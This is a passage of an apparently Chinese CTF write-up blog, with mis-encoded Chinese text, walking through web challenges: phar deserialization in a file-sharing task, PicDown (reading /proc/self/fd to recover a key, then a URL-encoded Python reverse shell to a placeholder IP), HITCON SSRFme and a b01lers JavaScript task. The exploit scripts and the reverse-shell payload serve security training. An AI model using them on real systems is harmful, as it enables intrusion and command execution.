class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br><span class="hljs-comment">//Filelistå®ä¾‹åŒ–å¯¹è±¡é”€æ¯æ—¶ï¼Œè§¦å‘__destructé­”æœ¯æ–¹æ³•å°†ç»“æœè¾“å‡º</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ³¨æ„<code>phar</code>ååºåˆ—åŒ–è§¦å‘æ¡ä»¶ä¹‹ä¸€æ˜¯è¦å­˜åœ¨ä¸€äº›å—å½±å“çš„æ“ä½œæ•°ï¼š</p><p><img src="/img/dropbox14.png" alt="dropbox14"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">//Fileç±»ä¸­çš„openå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨å¾ˆå¤šåœ°æ–¹è¢«è°ƒç”¨</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å­˜åœ¨<code>phar</code>ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();<br>   &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;files[]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag.txt&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pharphar.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>æœ€åè¦æ³¨æ„çš„ç‚¹å°±æ˜¯<code>download.php</code>ä¸‹å­˜åœ¨è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p><p><img src="/img/dropbox11.png" alt="dropbox11"></p><p>æ‰€ä»¥ååºåˆ—åŒ–è¦åœ¨<code>delate.php</code>é¡µé¢ä¸‹è§¦å‘ã€‚</p><p><code>filename=phar://pharphar.jpg</code></p><p><img src="/img/picdown15.png" alt="picdown15"></p><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</h2><p><img src="/img/picdown1.png" alt="picdown1"></p><p>ï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="/img/picdown2.png" alt="picdown2"></p><p>ï¼Ÿï¼Ÿï¼Ÿ</p><p>éšä¾¿è¾“ç‚¹ä¸œè¥¿å›è½¦ï¼Œæ³¨æ„<code>URL</code>ï¼š</p><p><img src="/img/picdown3.png" alt="picdown3"></p><p>éšä¾¿è¾“äº†äº›ç½‘ç«™éƒ½æ²¡å•¥ååº”ï¼Œæƒ³åˆ°<code>URL</code>å¯ä»¥åˆ©ç”¨<code>file</code>è¯»æœ¬åœ°æ–‡ä»¶ã€‚ã€‚ä½†è¯»å•¥ä¹Ÿä¸çŸ¥é“ã€‚ã€‚</p><p>å‚è€ƒï¼š<code>https://www.cnblogs.com/Article-kelp/p/16095712.html</code></p><p>é¦–å…ˆå¾—çŸ¥é“è¿™é¢˜ç”¨çš„æ˜¯<code>python2</code>çš„<code>urllib</code>çš„<code>urlopen</code>ï¼Œå’Œ<code>urllib2</code>ä¸­çš„<code>urlopen</code>æ˜æ˜¾åŒºåˆ«å°±æ˜¯<code>urllib.urlopen</code>æ”¯æŒå°†è·¯å¾„ä½œä¸ºå‚æ•°å»æ‰“å¼€å¯¹åº”çš„æœ¬åœ°è·¯å¾„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å¡«å…¥è·¯å¾„è¯»å–æ–‡ä»¶ã€‚</p><p>æ¯”å¦‚<code>/etc/passwd</code>è¿™ä¸œè¥¿ç®—æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„è€Œä¸æ˜¯<code>URL</code>ï¼Œä½†ä»å¯ä»¥é€šè¿‡è¾“å…¥è·¯å¾„è¯»å–æ–‡ä»¶ï¼š</p><p><img src="/img/picdonw2.png" alt="picdonw2"></p><p>æ¥ä¸‹æ¥å°±æ˜¯<code>proc</code>ç›®å½•åˆ©ç”¨ï¼Œä¸»è¦å°±æ˜¯ä¸‹é¢è¿™äº›ä¸œè¥¿ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#å‚è€ƒï¼šhttps://www.anquanke.com/post/id/241148</span><br><span class="hljs-comment">#selfä»£æ›¿äº†pidï¼Œè¿™é‡ŒæŒ‡çš„æ˜¯å½“å‰è¿è¡Œçš„è¿›ç¨‹</span><br><span class="hljs-regexp">/proc/</span>self/cmdline å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span> æŒ‡å‘å½“å‰è¿›ç¨‹çš„è¿è¡Œç›®å½•<br><span class="hljs-regexp">/proc/</span>self/exe æŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶<br><span class="hljs-regexp">/proc/</span>self/environ å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/fd/</span> å½“å‰è¿›ç¨‹å·²æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦<br></code></pre></td></tr></table></figure><p><code>page?url=/proc/self/cmdline</code></p><p><img src="/img/picdown5.png" alt="picdown5"></p><p><code>page?url=/app.py</code></p><p><img src="/img/picdown6.png" alt="picdown6"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page</span>():<br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">manager</span>():<br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯<code>/no_one_know_the_manager</code>è¿™ä¸ªè·¯ç”±ï¼Œå®ƒä¼šåˆ¤æ–­ä¼ è¿›æ¥çš„keyå‚æ•°å’Œé™æ€å˜é‡SECRET_KEYæ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰çš„è¯å°±ä½¿ç”¨<code>os.system()</code>æ–¹æ³•æ‰§è¡Œä¼ è¿›æ¥çš„shellå‚æ•°(ä¸è¿‡æ³¨æ„è¿™é‡Œæ˜¯æ²¡å›æ˜¾çš„)ã€‚</p><p><code>SECRET_KEY</code>è·å–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span> <br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)       <span class="hljs-comment"># ç”¨open()æ‰“å¼€/tmp/secret.txtæ–‡ä»¶</span><br>SECRET_KEY = f.read().strip()      <span class="hljs-comment"># è¯»å–secret.txtæ–‡ä»¶ï¼Œå°†å†…å®¹èµ‹ç»™SECRET_KEY</span><br>os.remove(SECRET_FILE) <span class="hljs-comment">#åˆ é™¤/tmp/secret.txtæ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢é‚£ç¯‡æ–‡ç« å¯ä»¥çŸ¥é“ï¼š</p><p><strong>åœ¨ linux  ç³»ç»Ÿä¸­ï¼Œå¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></p><p>&#x2F;proc&#x2F;[pid]&#x2F;fd è¿™ä¸ªç›®å½•é‡ŒåŒ…å«äº†è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼Œç›®å½•é‡Œé¢æœ‰ä¸€å †&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;idæ–‡ä»¶ï¼Œidå°±æ˜¯è¿›ç¨‹è®°å½•çš„æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦çš„åºå·ã€‚æ¥ä¸‹æ¥å¯ä»¥é€šè¿‡æ‰‹åŠ¨è¾“æˆ–è€…çˆ†ç ´å»æ‹¿æ•°æ®ã€‚æˆ‘å¾ˆæ‡’æ‰€ä»¥ç›´æ¥ç…§ç€<code>wp</code>é‡Œçš„ç»“æœå°è¯•äº†ã€‚ã€‚</p><p><code>/page?url=/proc/self/fd/3</code></p><p><img src="/img/picdown7.png" alt="picdown7"></p><p>æ‹¿åˆ°<code>SECRET_KEY</code>åé¢å°±æ˜¯<code>GET</code>ä¼ å‚<code>shell</code></p><p>åé¢å°±æ˜¯åå¼¹<code>shell</code>äº†ã€‚ã€‚ä½†æˆ‘çš„<code>VPS</code>è¿˜æ²¡å¼„å¥½æ‰€ä»¥è¿™ä¸ªå‘å°±å…ˆç•™ç€ï¼Œè¿™é‡Œç”¨éé¢„æœŸè¯»äº†flagï¼š</p><p><img src="/img/picdown4.png" alt="picdown4"></p><p>2024.1.2è¡¥å……ï¼š</p><p>è·å–å¯†é’¥ååå¼¹<code>shell</code>ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/no_one_know_the_manager?key<span class="hljs-operator">=</span>OEv<span class="hljs-number">7</span>KST<span class="hljs-number">0</span>mYwp<span class="hljs-number">7</span>AwYUjP<span class="hljs-number">3</span>wfp<span class="hljs-number">13</span>Gm/<span class="hljs-number">7</span>ais<span class="hljs-number">0</span>wOg<span class="hljs-number">150</span>wX<span class="hljs-number">8</span>I<span class="hljs-operator">=</span>&amp;shell<span class="hljs-operator">=</span>python -<span class="hljs-keyword">c</span> &#x27;import socket<span class="hljs-variable">%2</span>Csubprocess<span class="hljs-variable">%2</span>Cos<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>Dsocket.socket(socket.AF_INET<span class="hljs-variable">%2</span>Csocket.SOCK_STREAM)<span class="hljs-variable">%3</span>Bs.connect((<span class="hljs-string">&quot;IPåœ°å€&quot;</span><span class="hljs-variable">%2</span>C<span class="hljs-number">9001</span>))<span class="hljs-variable">%3</span>Bos.dup<span class="hljs-number">2</span>(s.fileno()<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span>)<span class="hljs-variable">%3</span>B os.dup<span class="hljs-number">2</span>(s.fileno()<span class="hljs-variable">%2</span>C<span class="hljs-number">1</span>)<span class="hljs-variable">%3</span>Bos.dup<span class="hljs-number">2</span>(s.fileno()<span class="hljs-variable">%2</span>C<span class="hljs-number">2</span>)<span class="hljs-variable">%3</span>Bimport pty<span class="hljs-variable">%3</span>B pty.spawn(<span class="hljs-string">&quot;%2Fbin%2Fbash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><p><code>ls</code>å<code>cat /flag</code>å°±è¡Œï¼Œæ³¨æ„åå¼¹å‘½ä»¤è¦<code>URL</code>ç¼–ç ä¸€ä¸‹</p><p><img src="/img/fantanshell.png" alt="fantanshell"></p><h2 id="HITCON-2017-SSRFme-æœªåšå®Œ"><a href="#HITCON-2017-SSRFme-æœªåšå®Œ" class="headerlink" title="[HITCON 2017]SSRFme(æœªåšå®Œ)"></a>[HITCON 2017]SSRFme(æœªåšå®Œ)</h2><p><img src="/img/hihtssrfme1.png" alt="hihtssrfme1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>        <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-comment">//HTTP_X_FORWARDED_FORå¯ä»¥ä¼ªé€ </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]; <span class="hljs-comment">//10.244.80.12</span><br><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-comment">//MD5åŠ å¯†</span><br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//åˆ›å»ºç›®å½•</span><br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//åˆ‡æ¢è‡³ç›®å½•</span><br><br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;GET &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>    <span class="hljs-variable">$dir</span>  = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<span class="hljs-comment">//æŠŠæ–‡ä»¶åä¸­çš„.æ¢æˆç©º</span><br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$dir</span>);<br>    @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)<br></code></pre></td></tr></table></figure><p>ä»£ç å¾ˆå¥½ç†è§£ï¼Œä¸»è¦æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</code></p><p><code>shell_exec</code>æ‰§è¡Œçš„å‚æ•°æ˜¯<code>GET</code>+<code>url</code>ç»è¿‡è½¬ä¹‰çš„å€¼ã€‚ã€‚é¢˜è¿˜æ˜¯åšçš„å¤ªå°‘äº†ï¼Œ<code>GET</code>å‘½ä»¤ç¬¬ä¸€æ¬¡ç¢°åˆ°ï¼Œæœäº†æœGETå‘½ä»¤æ‰§è¡Œæ¼æ´</p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>è¿™é¢˜é¡µé¢åˆ·æ–°çš„å¾ˆå¿«å°±æŠ“åŒ…çœ‹äº†ã€‚ã€‚</p><p><img src="/img/welcometoearth1.png" alt="welcometoearth1"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeydown</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  event = event || <span class="hljs-variable language_">window</span>.<span class="hljs-property">event</span>;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">keyCode</span> == <span class="hljs-number">27</span>) &#123; <span class="hljs-comment">//è‹¥æŒ‰ä¸‹esc</span><br>    event.<span class="hljs-title function_">preventDefault</span>();<span class="hljs-comment">//é˜»æ­¢æµè§ˆå™¨è·³è½¬åˆ°å…¶ä»–é¡µé¢</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/chase/&quot;</span>;<span class="hljs-comment">//å°†å½“å‰é¡µé¢çš„ URL è®¾ç½®ä¸º &quot;/chase/&quot;ï¼Œå®ç°é¡µé¢è·³è½¬åˆ° &quot;/chase/&quot;</span><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-title function_">die</span>();<span class="hljs-comment">//å¦åˆ™è°ƒç”¨dieå‡½æ•°</span><br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">dietimer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">10000</span>); <span class="hljs-comment">//ç­‰å¾…åç§’è°ƒç”¨dieå‡½æ•°</span><br>  <span class="hljs-title function_">die</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">die</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = 